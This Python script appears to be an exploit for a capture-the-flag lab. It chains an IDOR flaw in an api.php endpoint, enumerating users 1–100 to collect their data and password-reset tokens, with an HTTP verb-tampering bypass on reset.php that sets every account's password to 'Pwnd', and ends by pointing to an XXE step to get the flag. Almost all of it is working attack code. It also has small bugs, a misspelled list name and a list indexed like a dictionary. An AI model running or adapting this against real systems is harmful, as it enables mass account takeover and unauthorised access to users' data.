#! /usr/bin/python3

import requests
import json
from tabulate import tabulate

# Set IP:
Ip = "94.237.62.195:55801" # [CHANGE ME]
Session = "ie6sig2nankop84ntutsa3vsmn" # [CHANGE ME]

# IDOR Vulnerable URL's:
User_Url = f"http://{Ip}/api.php/user/"
Token_Url = f"http://{Ip}/api.php/token/"

# Verb Tampering Vulnerable URL:
Target = f"http://{Ip}/reset.php"

# Authentication URL:
Auth = f"http://{Ip}/index.php"

# Success String:
Succ = "Admin"

print("[!] Exploiting IDOR in \"api.php\" To Collect User Info")

# Grab Users:
User_Data = []
Adm = []

# Admin User Search/IDOR Exploit:
for UID in range(1, 101): # Found that the max amount of user is 100

	# User Payload Setup
	Head = {'Cookie': f"PHPSESSID={Session}; uid={UID}"}
	IDOR_User_URL = User_Url+str(UID) # http://{Ip}/api.php/user/[UID]

	# Send User Payload:
	Response = requests.get(IDOR_User_URL, headers=Head)

	# Check for Admin User:
	if Succ in Response.text:
		print(f"[!] Admin User Found:")
		print(Response.text)

		IDOR_Token_URL = Token_Url+str(UID) # http://{Ip}/api.php/token/[UID]
		Users = Response.json() 

		# Send Token Payload:
		Response = requests.get(IDOR_Token_URL, headers=Head) 

		# Merge User and Token JSON to one JSON string
		Merged = {**Users, **Response.json()}

		# Track User Data: 
		User_Data.append(Merged)
		Adn.append(Merged)

	else:

		# Token Paylod Setup:
		IDOR_Token_URL = Token_Url+str(UID) # http://{Ip}/api.php/token/[UID]
		Users = Response.json()

		# Send Token Payload:
		Response = requests.get(IDOR_Token_URL, headers=Head) 

		# Merge User and Token JSON to one JSON string
		Merged = {**Users, **Response.json()}

		# Track User Data: 
		User_Data.append(Merged)


print(f"[!] Abusing HTTP Verb Tampering in /reset.php to reset All User Passwords to \"Pwnd\"")

# Chain Exploited IDOR to change all User Passwords & Authenticate:
for User in User_Data:

	# Setting up Reset:
	Head = {'Cookie': f"PHPSESSID={Session}; uid={User['uid']}"}
	Payload = Target+f"?uid={User['uid']}&token={User['token']}&password=Pwnd" # http://{Ip}/reset.php?uid=[uid]&token=[token]&password=[New_Password]
	""" 
	Payload Details:
	- Original request is a POST request that tracks if the PHPSESSID is valid for the user being sent for reset. 
		-> POST data has the variables of uid=[uid]&token=[token]&password=[New_Password]
		-> The POST request does not track PHP Session if its passed as URL params (As seen in the payload)
		-> Since the IDOR data gave us all we need to reset we can abuse this by reseting any users password
		-> This exploit uses GET requests as its more reliable than POST but both would work. 
	"""

	# Reset Password:
	Response = requests.get(Payload, headers=Head)


	if "Access Denied" in Response.text: # Returns True if status_code is less than 400, otherwise False
		print(f"[!] Reset Error on {User['username']}")


print(f"[!] Dumping ALL NEW User Data\n")

table = []
header = ["UID", "USER_NAME", "PASSWORD" ]
for x in User_Data:
	table.append([x['uid'], x['username'], "Pwnd"])


print(tabulate(table, headers=header, tablefmt="grid"))

print(f"\n[$] Auth as Admin User [{Adm['username']}:Pwnd] and Exploit XXE to get flag.")

